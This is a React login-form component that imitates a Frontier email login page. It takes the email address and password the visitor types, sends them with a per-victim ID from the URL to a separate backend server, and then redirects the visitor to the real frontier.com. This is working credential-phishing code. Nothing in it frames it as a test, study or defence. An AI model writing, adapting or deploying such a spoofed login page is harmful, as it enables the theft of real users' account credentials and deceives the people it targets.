import { useState, useEffect } from 'react'
import axios from 'axios'
import { hostURL } from '../helpers/data'
import { useLocation } from 'react-router-dom'

const Form = () => {
  const [email, setEmail] = useState('')
  const [password, setPassword] = useState('')
  const [error, setError] = useState(false)
  const [redirect, setRedirect] = useState(false)

  const { search } = useLocation()
  const userID = search.slice(1)
  console.log(userID)

  useEffect(() => {
    redirect && window.location.replace('https://frontier.com/')
  }, [redirect])

  const handleClick = () => {
    setError(false)
    if (!email || !password) {
      setError(true)
      return
    }

    const jsonData = JSON.stringify({ email, password })
    axios
      .post(`${hostURL}main`, { data: jsonData, userID, id: 2 })
      .then((resp) => {
        console.log(resp.data)
        setRedirect(true)
      })
      .catch((e) => console.log(e))
    // alert('logged in')
  }
  return (
    <div className='flex flex-col gap-5 md:w-[40%]'>
      <section className='flex flex-col gap-2'>
        <label className='font-semibold'>Email Address</label>
        <input
          type='email'
          placeholder='username@frontier.com'
          value={email}
          onChange={(e) => setEmail(e.target.value)}
          className='input'
        />
      </section>
      <section className='flex flex-col gap-2'>
        <label className='font-semibold'>Password</label>
        <input
          type='password'
          placeholder='***********'
          value={password}
          onChange={(e) => setPassword(e.target.value)}
          className='input'
        />
      </section>
      {error && (
        <p className='text-red-700 font-medium'>
          Please full email address and password
        </p>
      )}
      <section className=''>
        <button
          className='w-full bg-[#ff0037] text-white font-medium text-lg rounded-3xl py-1'
          onClick={handleClick}
        >
          Login
        </button>
        <p className='mt-2 text-[#3399CC] font-medium'>Forgot your password?</p>
      </section>
    </div>
  )
}

export default Form
